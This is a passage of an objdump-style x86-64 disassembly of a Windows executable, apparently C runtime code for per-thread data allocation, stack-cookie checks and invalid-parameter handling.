   140005cbf:	48 85 c0             	test   %rax,%rax
   140005cc2:	75 10                	jne    0x140005cd4
   140005cc4:	33 d2                	xor    %edx,%edx
   140005cc6:	e8 9d 2e 00 00       	call   0x140008b68
   140005ccb:	33 c9                	xor    %ecx,%ecx
   140005ccd:	e8 5a 09 00 00       	call   0x14000662c
   140005cd2:	eb ce                	jmp    0x140005ca2
   140005cd4:	48 8b d7             	mov    %rdi,%rdx
   140005cd7:	e8 8c 2e 00 00       	call   0x140008b68
   140005cdc:	85 c0                	test   %eax,%eax
   140005cde:	75 12                	jne    0x140005cf2
   140005ce0:	8b 0d ca 23 01 00    	mov    0x123ca(%rip),%ecx        # 0x1400180b0
   140005ce6:	33 d2                	xor    %edx,%edx
   140005ce8:	e8 7b 2e 00 00       	call   0x140008b68
   140005ced:	48 8b cf             	mov    %rdi,%rcx
   140005cf0:	eb db                	jmp    0x140005ccd
   140005cf2:	48 8b cf             	mov    %rdi,%rcx
   140005cf5:	e8 0a fd ff ff       	call   0x140005a04
   140005cfa:	33 c9                	xor    %ecx,%ecx
   140005cfc:	e8 2b 09 00 00       	call   0x14000662c
   140005d01:	8b cb                	mov    %ebx,%ecx
   140005d03:	ff 15 8f 83 00 00    	call   *0x838f(%rip)        # 0x14000e098
   140005d09:	48 85 ff             	test   %rdi,%rdi
   140005d0c:	74 13                	je     0x140005d21
   140005d0e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005d13:	48 8b c7             	mov    %rdi,%rax
   140005d16:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140005d1b:	48 83 c4 20          	add    $0x20,%rsp
   140005d1f:	5f                   	pop    %rdi
   140005d20:	c3                   	ret
   140005d21:	e8 a2 f9 ff ff       	call   0x1400056c8
   140005d26:	cc                   	int3
   140005d27:	cc                   	int3
   140005d28:	40 53                	rex push %rbx
   140005d2a:	48 83 ec 20          	sub    $0x20,%rsp
   140005d2e:	8b 0d 7c 23 01 00    	mov    0x1237c(%rip),%ecx        # 0x1400180b0
   140005d34:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140005d37:	74 1b                	je     0x140005d54
   140005d39:	e8 22 2e 00 00       	call   0x140008b60
   140005d3e:	48 8b d8             	mov    %rax,%rbx
   140005d41:	48 85 c0             	test   %rax,%rax
   140005d44:	74 08                	je     0x140005d4e
   140005d46:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140005d4a:	74 78                	je     0x140005dc4
   140005d4c:	eb 6d                	jmp    0x140005dbb
   140005d4e:	8b 0d 5c 23 01 00    	mov    0x1235c(%rip),%ecx        # 0x1400180b0
   140005d54:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   140005d58:	e8 0b 2e 00 00       	call   0x140008b68
   140005d5d:	85 c0                	test   %eax,%eax
   140005d5f:	74 63                	je     0x140005dc4
   140005d61:	ba c8 03 00 00       	mov    $0x3c8,%edx
   140005d66:	b9 01 00 00 00       	mov    $0x1,%ecx
   140005d6b:	e8 44 08 00 00       	call   0x1400065b4
   140005d70:	8b 0d 3a 23 01 00    	mov    0x1233a(%rip),%ecx        # 0x1400180b0
   140005d76:	48 8b d8             	mov    %rax,%rbx
   140005d79:	48 85 c0             	test   %rax,%rax
   140005d7c:	75 10                	jne    0x140005d8e
   140005d7e:	33 d2                	xor    %edx,%edx
   140005d80:	e8 e3 2d 00 00       	call   0x140008b68
   140005d85:	33 c9                	xor    %ecx,%ecx
   140005d87:	e8 a0 08 00 00       	call   0x14000662c
   140005d8c:	eb 36                	jmp    0x140005dc4
   140005d8e:	48 8b d3             	mov    %rbx,%rdx
   140005d91:	e8 d2 2d 00 00       	call   0x140008b68
   140005d96:	85 c0                	test   %eax,%eax
   140005d98:	75 12                	jne    0x140005dac
   140005d9a:	8b 0d 10 23 01 00    	mov    0x12310(%rip),%ecx        # 0x1400180b0
   140005da0:	33 d2                	xor    %edx,%edx
   140005da2:	e8 c1 2d 00 00       	call   0x140008b68
   140005da7:	48 8b cb             	mov    %rbx,%rcx
   140005daa:	eb db                	jmp    0x140005d87
   140005dac:	48 8b cb             	mov    %rbx,%rcx
   140005daf:	e8 50 fc ff ff       	call   0x140005a04
   140005db4:	33 c9                	xor    %ecx,%ecx
   140005db6:	e8 71 08 00 00       	call   0x14000662c
   140005dbb:	48 8b c3             	mov    %rbx,%rax
   140005dbe:	48 83 c4 20          	add    $0x20,%rsp
   140005dc2:	5b                   	pop    %rbx
   140005dc3:	c3                   	ret
   140005dc4:	e8 ff f8 ff ff       	call   0x1400056c8
   140005dc9:	cc                   	int3
   140005dca:	cc                   	int3
   140005dcb:	cc                   	int3
   140005dcc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005dd1:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140005dd6:	57                   	push   %rdi
   140005dd7:	48 83 ec 20          	sub    $0x20,%rsp
   140005ddb:	ff 15 af 82 00 00    	call   *0x82af(%rip)        # 0x14000e090
   140005de1:	8b 0d c9 22 01 00    	mov    0x122c9(%rip),%ecx        # 0x1400180b0
   140005de7:	33 f6                	xor    %esi,%esi
   140005de9:	8b d8                	mov    %eax,%ebx
   140005deb:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140005dee:	74 1d                	je     0x140005e0d
   140005df0:	e8 6b 2d 00 00       	call   0x140008b60
   140005df5:	48 8b f8             	mov    %rax,%rdi
   140005df8:	48 85 c0             	test   %rax,%rax
   140005dfb:	74 0a                	je     0x140005e07
   140005dfd:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140005e01:	48 0f 44 fe          	cmove  %rsi,%rdi
   140005e05:	eb 72                	jmp    0x140005e79
   140005e07:	8b 0d a3 22 01 00    	mov    0x122a3(%rip),%ecx        # 0x1400180b0
   140005e0d:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   140005e11:	e8 52 2d 00 00       	call   0x140008b68
   140005e16:	85 c0                	test   %eax,%eax
   140005e18:	75 05                	jne    0x140005e1f
   140005e1a:	48 8b fe             	mov    %rsi,%rdi
   140005e1d:	eb 5a                	jmp    0x140005e79
   140005e1f:	ba c8 03 00 00       	mov    $0x3c8,%edx
   140005e24:	b9 01 00 00 00       	mov    $0x1,%ecx
   140005e29:	e8 86 07 00 00       	call   0x1400065b4
   140005e2e:	8b 0d 7c 22 01 00    	mov    0x1227c(%rip),%ecx        # 0x1400180b0
   140005e34:	48 8b f8             	mov    %rax,%rdi
   140005e37:	48 85 c0             	test   %rax,%rax
   140005e3a:	75 10                	jne    0x140005e4c
   140005e3c:	33 d2                	xor    %edx,%edx
   140005e3e:	e8 25 2d 00 00       	call   0x140008b68
   140005e43:	33 c9                	xor    %ecx,%ecx
   140005e45:	e8 e2 07 00 00       	call   0x14000662c
   140005e4a:	eb ce                	jmp    0x140005e1a
   140005e4c:	48 8b d7             	mov    %rdi,%rdx
   140005e4f:	e8 14 2d 00 00       	call   0x140008b68
   140005e54:	85 c0                	test   %eax,%eax
   140005e56:	75 12                	jne    0x140005e6a
   140005e58:	8b 0d 52 22 01 00    	mov    0x12252(%rip),%ecx        # 0x1400180b0
   140005e5e:	33 d2                	xor    %edx,%edx
   140005e60:	e8 03 2d 00 00       	call   0x140008b68
   140005e65:	48 8b cf             	mov    %rdi,%rcx
   140005e68:	eb db                	jmp    0x140005e45
   140005e6a:	48 8b cf             	mov    %rdi,%rcx
   140005e6d:	e8 92 fb ff ff       	call   0x140005a04
   140005e72:	33 c9                	xor    %ecx,%ecx
   140005e74:	e8 b3 07 00 00       	call   0x14000662c
   140005e79:	8b cb                	mov    %ebx,%ecx
   140005e7b:	ff 15 17 82 00 00    	call   *0x8217(%rip)        # 0x14000e098
   140005e81:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005e86:	48 8b c7             	mov    %rdi,%rax
   140005e89:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140005e8e:	48 83 c4 20          	add    $0x20,%rsp
   140005e92:	5f                   	pop    %rdi
   140005e93:	c3                   	ret
   140005e94:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005e99:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140005e9e:	57                   	push   %rdi
   140005e9f:	48 83 ec 20          	sub    $0x20,%rsp
   140005ea3:	8b 0d 07 22 01 00    	mov    0x12207(%rip),%ecx        # 0x1400180b0
   140005ea9:	33 db                	xor    %ebx,%ebx
   140005eab:	48 8b f2             	mov    %rdx,%rsi
   140005eae:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140005eb1:	74 1b                	je     0x140005ece
   140005eb3:	e8 a8 2c 00 00       	call   0x140008b60
   140005eb8:	48 8b f8             	mov    %rax,%rdi
   140005ebb:	48 85 c0             	test   %rax,%rax
   140005ebe:	74 08                	je     0x140005ec8
   140005ec0:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140005ec4:	74 79                	je     0x140005f3f
   140005ec6:	eb 6d                	jmp    0x140005f35
   140005ec8:	8b 0d e2 21 01 00    	mov    0x121e2(%rip),%ecx        # 0x1400180b0
   140005ece:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   140005ed2:	e8 91 2c 00 00       	call   0x140008b68
   140005ed7:	85 c0                	test   %eax,%eax
   140005ed9:	74 64                	je     0x140005f3f
   140005edb:	ba c8 03 00 00       	mov    $0x3c8,%edx
   140005ee0:	b9 01 00 00 00       	mov    $0x1,%ecx
   140005ee5:	e8 ca 06 00 00       	call   0x1400065b4
   140005eea:	8b 0d c0 21 01 00    	mov    0x121c0(%rip),%ecx        # 0x1400180b0
   140005ef0:	48 8b f8             	mov    %rax,%rdi
   140005ef3:	48 85 c0             	test   %rax,%rax
   140005ef6:	75 10                	jne    0x140005f08
   140005ef8:	33 d2                	xor    %edx,%edx
   140005efa:	e8 69 2c 00 00       	call   0x140008b68
   140005eff:	33 c9                	xor    %ecx,%ecx
   140005f01:	e8 26 07 00 00       	call   0x14000662c
   140005f06:	eb 37                	jmp    0x140005f3f
   140005f08:	48 8b d7             	mov    %rdi,%rdx
   140005f0b:	e8 58 2c 00 00       	call   0x140008b68
   140005f10:	85 c0                	test   %eax,%eax
   140005f12:	75 12                	jne    0x140005f26
   140005f14:	8b 0d 96 21 01 00    	mov    0x12196(%rip),%ecx        # 0x1400180b0
   140005f1a:	33 d2                	xor    %edx,%edx
   140005f1c:	e8 47 2c 00 00       	call   0x140008b68
   140005f21:	48 8b cf             	mov    %rdi,%rcx
   140005f24:	eb db                	jmp    0x140005f01
   140005f26:	48 8b cf             	mov    %rdi,%rcx
   140005f29:	e8 d6 fa ff ff       	call   0x140005a04
   140005f2e:	33 c9                	xor    %ecx,%ecx
   140005f30:	e8 f7 06 00 00       	call   0x14000662c
   140005f35:	48 69 de c8 03 00 00 	imul   $0x3c8,%rsi,%rbx
   140005f3c:	48 03 df             	add    %rdi,%rbx
   140005f3f:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140005f44:	48 8b c3             	mov    %rbx,%rax
   140005f47:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005f4c:	48 83 c4 20          	add    $0x20,%rsp
   140005f50:	5f                   	pop    %rdi
   140005f51:	c3                   	ret
   140005f52:	cc                   	int3
   140005f53:	cc                   	int3
   140005f54:	48 83 ec 28          	sub    $0x28,%rsp
   140005f58:	48 8d 0d 75 fb ff ff 	lea    -0x48b(%rip),%rcx        # 0x140005ad4
   140005f5f:	e8 ec 2b 00 00       	call   0x140008b50
   140005f64:	89 05 46 21 01 00    	mov    %eax,0x12146(%rip)        # 0x1400180b0
   140005f6a:	83 f8 ff             	cmp    $0xffffffff,%eax
   140005f6d:	75 04                	jne    0x140005f73
   140005f6f:	32 c0                	xor    %al,%al
   140005f71:	eb 15                	jmp    0x140005f88
   140005f73:	e8 54 fe ff ff       	call   0x140005dcc
   140005f78:	48 85 c0             	test   %rax,%rax
   140005f7b:	75 09                	jne    0x140005f86
   140005f7d:	33 c9                	xor    %ecx,%ecx
   140005f7f:	e8 0c 00 00 00       	call   0x140005f90
   140005f84:	eb e9                	jmp    0x140005f6f
   140005f86:	b0 01                	mov    $0x1,%al
   140005f88:	48 83 c4 28          	add    $0x28,%rsp
   140005f8c:	c3                   	ret
   140005f8d:	cc                   	int3
   140005f8e:	cc                   	int3
   140005f8f:	cc                   	int3
   140005f90:	48 83 ec 28          	sub    $0x28,%rsp
   140005f94:	8b 0d 16 21 01 00    	mov    0x12116(%rip),%ecx        # 0x1400180b0
   140005f9a:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140005f9d:	74 0c                	je     0x140005fab
   140005f9f:	e8 b4 2b 00 00       	call   0x140008b58
   140005fa4:	83 0d 05 21 01 00 ff 	orl    $0xffffffff,0x12105(%rip)        # 0x1400180b0
   140005fab:	b0 01                	mov    $0x1,%al
   140005fad:	48 83 c4 28          	add    $0x28,%rsp
   140005fb1:	c3                   	ret
   140005fb2:	cc                   	int3
   140005fb3:	cc                   	int3
   140005fb4:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140005fb9:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140005fbe:	57                   	push   %rdi
   140005fbf:	48 83 ec 20          	sub    $0x20,%rsp
   140005fc3:	48 8b 31             	mov    (%rcx),%rsi
   140005fc6:	33 ff                	xor    %edi,%edi
   140005fc8:	48 8b d9             	mov    %rcx,%rbx
   140005fcb:	48 85 f6             	test   %rsi,%rsi
   140005fce:	75 3b                	jne    0x14000600b
   140005fd0:	ff 15 ba 80 00 00    	call   *0x80ba(%rip)        # 0x14000e090
   140005fd6:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140005fda:	40 38 7b 10          	cmp    %dil,0x10(%rbx)
   140005fde:	75 0a                	jne    0x140005fea
   140005fe0:	48 89 7b 08          	mov    %rdi,0x8(%rbx)
   140005fe4:	c6 43 10 01          	movb   $0x1,0x10(%rbx)
   140005fe8:	eb 04                	jmp    0x140005fee
   140005fea:	48 8b 7b 08          	mov    0x8(%rbx),%rdi
   140005fee:	48 8b d7             	mov    %rdi,%rdx
   140005ff1:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140005ff6:	e8 99 fe ff ff       	call   0x140005e94
   140005ffb:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   140005fff:	48 8b f0             	mov    %rax,%rsi
   140006002:	48 89 03             	mov    %rax,(%rbx)
   140006005:	ff 15 8d 80 00 00    	call   *0x808d(%rip)        # 0x14000e098
   14000600b:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140006010:	48 8b c6             	mov    %rsi,%rax
   140006013:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140006018:	48 83 c4 20          	add    $0x20,%rsp
   14000601c:	5f                   	pop    %rdi
   14000601d:	c3                   	ret
   14000601e:	cc                   	int3
   14000601f:	cc                   	int3
   140006020:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006025:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000602a:	57                   	push   %rdi
   14000602b:	48 83 ec 20          	sub    $0x20,%rsp
   14000602f:	33 db                	xor    %ebx,%ebx
   140006031:	48 8b fa             	mov    %rdx,%rdi
   140006034:	48 8b f1             	mov    %rcx,%rsi
   140006037:	38 5a 10             	cmp    %bl,0x10(%rdx)
   14000603a:	75 18                	jne    0x140006054
   14000603c:	ff 15 4e 80 00 00    	call   *0x804e(%rip)        # 0x14000e090
   140006042:	8b c8                	mov    %eax,%ecx
   140006044:	48 89 5f 08          	mov    %rbx,0x8(%rdi)
   140006048:	c6 47 10 01          	movb   $0x1,0x10(%rdi)
   14000604c:	ff 15 46 80 00 00    	call   *0x8046(%rip)        # 0x14000e098
   140006052:	eb 04                	jmp    0x140006058
   140006054:	48 8b 5a 08          	mov    0x8(%rdx),%rbx
   140006058:	48 8d 04 de          	lea    (%rsi,%rbx,8),%rax
   14000605c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006061:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140006066:	48 83 c4 20          	add    $0x20,%rsp
   14000606a:	5f                   	pop    %rdi
   14000606b:	c3                   	ret
   14000606c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140006071:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140006076:	55                   	push   %rbp
   140006077:	57                   	push   %rdi
   140006078:	41 56                	push   %r14
   14000607a:	48 8d ac 24 10 fb ff 	lea    -0x4f0(%rsp),%rbp
   140006081:	ff 
   140006082:	48 81 ec f0 05 00 00 	sub    $0x5f0,%rsp
   140006089:	48 8b 05 b0 1f 01 00 	mov    0x11fb0(%rip),%rax        # 0x140018040
   140006090:	48 33 c4             	xor    %rsp,%rax
   140006093:	48 89 85 e0 04 00 00 	mov    %rax,0x4e0(%rbp)
   14000609a:	41 8b f8             	mov    %r8d,%edi
   14000609d:	8b f2                	mov    %edx,%esi
   14000609f:	8b d9                	mov    %ecx,%ebx
   1400060a1:	83 f9 ff             	cmp    $0xffffffff,%ecx
   1400060a4:	74 05                	je     0x1400060ab
   1400060a6:	e8 2d b5 ff ff       	call   0x1400015d8
   1400060ab:	33 d2                	xor    %edx,%edx
   1400060ad:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400060b2:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   1400060b8:	e8 73 6e 00 00       	call   0x14000cf30
   1400060bd:	33 d2                	xor    %edx,%edx
   1400060bf:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   1400060c3:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   1400060c9:	e8 62 6e 00 00       	call   0x14000cf30
   1400060ce:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   1400060d3:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400060d8:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   1400060dc:	48 8d 45 10          	lea    0x10(%rbp),%rax
   1400060e0:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1400060e5:	ff 15 4d 7f 00 00    	call   *0x7f4d(%rip)        # 0x14000e038
   1400060eb:	4c 8b b5 08 01 00 00 	mov    0x108(%rbp),%r14
   1400060f2:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   1400060f7:	49 8b ce             	mov    %r14,%rcx
   1400060fa:	45 33 c0             	xor    %r8d,%r8d
   1400060fd:	ff 15 3d 7f 00 00    	call   *0x7f3d(%rip)        # 0x14000e040
   140006103:	48 85 c0             	test   %rax,%rax
   140006106:	74 36                	je     0x14000613e
   140006108:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000610e:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140006113:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   140006118:	4c 8b c8             	mov    %rax,%r9
   14000611b:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140006120:	4d 8b c6             	mov    %r14,%r8
   140006123:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140006128:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   14000612d:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140006131:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140006136:	33 c9                	xor    %ecx,%ecx
   140006138:	ff 15 0a 7f 00 00    	call   *0x7f0a(%rip)        # 0x14000e048
   14000613e:	48 8b 85 08 05 00 00 	mov    0x508(%rbp),%rax
   140006145:	48 89 85 08 01 00 00 	mov    %rax,0x108(%rbp)
   14000614c:	48 8d 85 08 05 00 00 	lea    0x508(%rbp),%rax
   140006153:	48 83 c0 08          	add    $0x8,%rax
   140006157:	89 74 24 70          	mov    %esi,0x70(%rsp)
   14000615b:	48 89 85 a8 00 00 00 	mov    %rax,0xa8(%rbp)
   140006162:	48 8b 85 08 05 00 00 	mov    0x508(%rbp),%rax
   140006169:	48 89 45 80          	mov    %rax,-0x80(%rbp)
   14000616d:	89 7c 24 74          	mov    %edi,0x74(%rsp)
   140006171:	ff 15 d9 7e 00 00    	call   *0x7ed9(%rip)        # 0x14000e050
   140006177:	33 c9                	xor    %ecx,%ecx
   140006179:	8b f8                	mov    %eax,%edi
   14000617b:	ff 15 df 7e 00 00    	call   *0x7edf(%rip)        # 0x14000e060
   140006181:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140006186:	ff 15 cc 7e 00 00    	call   *0x7ecc(%rip)        # 0x14000e058
   14000618c:	85 c0                	test   %eax,%eax
   14000618e:	75 10                	jne    0x1400061a0
   140006190:	85 ff                	test   %edi,%edi
   140006192:	75 0c                	jne    0x1400061a0
   140006194:	83 fb ff             	cmp    $0xffffffff,%ebx
   140006197:	74 07                	je     0x1400061a0
   140006199:	8b cb                	mov    %ebx,%ecx
   14000619b:	e8 38 b4 ff ff       	call   0x1400015d8
   1400061a0:	48 8b 8d e0 04 00 00 	mov    0x4e0(%rbp),%rcx
   1400061a7:	48 33 cc             	xor    %rsp,%rcx
   1400061aa:	e8 21 6a 00 00       	call   0x14000cbd0
   1400061af:	4c 8d 9c 24 f0 05 00 	lea    0x5f0(%rsp),%r11
   1400061b6:	00 
   1400061b7:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   1400061bb:	49 8b 73 30          	mov    0x30(%r11),%rsi
   1400061bf:	49 8b e3             	mov    %r11,%rsp
   1400061c2:	41 5e                	pop    %r14
   1400061c4:	5f                   	pop    %rdi
   1400061c5:	5d                   	pop    %rbp
   1400061c6:	c3                   	ret
   1400061c7:	cc                   	int3
   1400061c8:	48 89 0d 81 2d 01 00 	mov    %rcx,0x12d81(%rip)        # 0x140018f50
   1400061cf:	c3                   	ret
   1400061d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400061d5:	55                   	push   %rbp
   1400061d6:	48 8b ec             	mov    %rsp,%rbp
   1400061d9:	48 83 ec 70          	sub    $0x70,%rsp
   1400061dd:	48 83 65 c0 00       	andq   $0x0,-0x40(%rbp)
   1400061e2:	83 3d 2b 2d 01 00 00 	cmpl   $0x0,0x12d2b(%rip)        # 0x140018f14
   1400061e9:	c6 45 d0 00          	movb   $0x0,-0x30(%rbp)
   1400061ed:	c6 45 e8 00          	movb   $0x0,-0x18(%rbp)
   1400061f1:	c6 45 f0 00          	movb   $0x0,-0x10(%rbp)
   1400061f5:	c6 45 f8 00          	movb   $0x0,-0x8(%rbp)
   1400061f9:	75 10                	jne    0x14000620b
   1400061fb:	0f 10 05 56 25 01 00 	movups 0x12556(%rip),%xmm0        # 0x140018758
   140006202:	c6 45 e8 01          	movb   $0x1,-0x18(%rbp)
   140006206:	f3 0f 7f 45 d8       	movdqu %xmm0,-0x28(%rbp)
   14000620b:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
   14000620f:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140006214:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140006218:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000621d:	e8 4a 00 00 00       	call   0x14000626c
   140006222:	80 7d e8 02          	cmpb   $0x2,-0x18(%rbp)
   140006226:	75 0b                	jne    0x140006233
   140006228:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
   14000622c:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140006233:	80 7d f0 00          	cmpb   $0x0,-0x10(%rbp)
   140006237:	74 0f                	je     0x140006248
   140006239:	8b 5d ec             	mov    -0x14(%rbp),%ebx
   14000623c:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140006240:	e8 eb f4 ff ff       	call   0x140005730
   140006245:	89 58 20             	mov    %ebx,0x20(%rax)
   140006248:	80 7d f8 00          	cmpb   $0x0,-0x8(%rbp)
   14000624c:	74 0f                	je     0x14000625d
   14000624e:	8b 5d f4             	mov    -0xc(%rbp),%ebx
   140006251:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140006255:	e8 d6 f4 ff ff       	call   0x140005730
   14000625a:	89 58 24             	mov    %ebx,0x24(%rax)
   14000625d:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140006264:	00 
   140006265:	48 83 c4 70          	add    $0x70,%rsp
   140006269:	5d                   	pop    %rbp
   14000626a:	c3                   	ret
   14000626b:	cc                   	int3
   14000626c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006271:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140006276:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000627b:	57                   	push   %rdi
   14000627c:	48 83 ec 30          	sub    $0x30,%rsp
   140006280:	48 8b e9             	mov    %rcx,%rbp
   140006283:	41 8b d9             	mov    %r9d,%ebx
   140006286:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   14000628b:	49 8b f8             	mov    %r8,%rdi
   14000628e:	48 8b f2             	mov    %rdx,%rsi
   140006291:	e8 1e fd ff ff       	call   0x140005fb4
   140006296:	48 85 c0             	test   %rax,%rax
   140006299:	74 47                	je     0x1400062e2
   14000629b:	48 8b 80 b8 03 00 00 	mov    0x3b8(%rax),%rax
   1400062a2:	48 85 c0             	test   %rax,%rax
   1400062a5:	74 3b                	je     0x1400062e2
   1400062a7:	49 ba 70 2a 57 34 48 	movabs $0xd6bc1f4834572a70,%r10
   1400062ae:	1f bc d6 
   1400062b1:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   1400062b6:	48 8b d6             	mov    %rsi,%rdx
   1400062b9:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400062be:	4c 8b c7             	mov    %rdi,%r8
   1400062c1:	48 8b cd             	mov    %rbp,%rcx
   1400062c4:	44 8b cb             	mov    %ebx,%r9d
   1400062c7:	ff 15 9b 7f 00 00    	call   *0x7f9b(%rip)        # 0x14000e268
   1400062cd:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400062d2:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   1400062d7:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   1400062dc:	48 83 c4 30          	add    $0x30,%rsp
   1400062e0:	5f                   	pop    %rdi
   1400062e1:	c3                   	ret
   1400062e2:	48 8b 54 24 68       	mov    0x68(%rsp),%rdx
   1400062e7:	48 8d 0d 62 2c 01 00 	lea    0x12c62(%rip),%rcx        # 0x140018f50
   1400062ee:	e8 2d fd ff ff       	call   0x140006020
   1400062f3:	4c 8b 1d 46 1d 01 00 	mov    0x11d46(%rip),%r11        # 0x140018040
   1400062fa:	48 8b 08             	mov    (%rax),%rcx
   1400062fd:	41 8b c3             	mov    %r11d,%eax
   140006300:	4c 33 d9             	xor    %rcx,%r11
   140006303:	83 e0 3f             	and    $0x3f,%eax
   140006306:	8a c8                	mov    %al,%cl
   140006308:	49 d3 cb             	ror    %cl,%r11
   14000630b:	4d 85 db             	test   %r11,%r11
   14000630e:	74 0f                	je     0x14000631f
   140006310:	49 ba 70 2a 57 34 48 	movabs $0xd6bc1f4834572a70,%r10
   140006317:	1f bc d6 
   14000631a:	49 8b c3             	mov    %r11,%rax
   14000631d:	eb 92                	jmp    0x1400062b1
   14000631f:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   140006324:	44 8b cb             	mov    %ebx,%r9d
   140006327:	4c 8b c7             	mov    %rdi,%r8
   14000632a:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000632f:	48 8b d6             	mov    %rsi,%rdx
   140006332:	48 8b cd             	mov    %rbp,%rcx
   140006335:	e8 22 00 00 00       	call   0x14000635c
   14000633a:	cc                   	int3
   14000633b:	cc                   	int3
   14000633c:	48 83 ec 38          	sub    $0x38,%rsp
   140006340:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140006346:	45 33 c9             	xor    %r9d,%r9d
   140006349:	45 33 c0             	xor    %r8d,%r8d
   14000634c:	33 d2                	xor    %edx,%edx
   14000634e:	33 c9                	xor    %ecx,%ecx
   140006350:	e8 7b fe ff ff       	call   0x1400061d0
   140006355:	48 83 c4 38          	add    $0x38,%rsp
   140006359:	c3                   	ret
   14000635a:	cc                   	int3
   14000635b:	cc                   	int3
   14000635c:	48 83 ec 28          	sub    $0x28,%rsp
   140006360:	b9 17 00 00 00       	mov    $0x17,%ecx
   140006365:	ff 15 05 7d 00 00    	call   *0x7d05(%rip)        # 0x14000e070
   14000636b:	85 c0                	test   %eax,%eax
   14000636d:	74 07                	je     0x140006376
   14000636f:	b9 05 00 00 00       	mov    $0x5,%ecx
   140006374:	cd 29                	int    $0x29
   140006376:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000637c:	ba 17 04 00 c0       	mov    $0xc0000417,%edx
   140006381:	41 8d 48 01          	lea    0x1(%r8),%ecx
   140006385:	e8 e2 fc ff ff       	call   0x14000606c
   14000638a:	ff 15 98 7d 00 00    	call   *0x7d98(%rip)        # 0x14000e128
   140006390:	48 8b c8             	mov    %rax,%rcx
   140006393:	ba 17 04 00 c0       	mov    $0xc0000417,%edx
   140006398:	48 83 c4 28          	add    $0x28,%rsp
   14000639c:	48 ff 25 95 7d 00 00 	rex.W jmp *0x7d95(%rip)        # 0x14000e138
   1400063a3:	cc                   	int3
   1400063a4:	40 53                	rex push %rbx
   1400063a6:	48 83 ec 20          	sub    $0x20,%rsp
   1400063aa:	33 db                	xor    %ebx,%ebx
   1400063ac:	48 85 c9             	test   %rcx,%rcx
   1400063af:	74 0d                	je     0x1400063be
   1400063b1:	48 85 d2             	test   %rdx,%rdx
   1400063b4:	74 08                	je     0x1400063be
   1400063b6:	4d 85 c0             	test   %r8,%r8
   1400063b9:	75 1c                	jne    0x1400063d7
   1400063bb:	66 89 19             	mov    %bx,(%rcx)
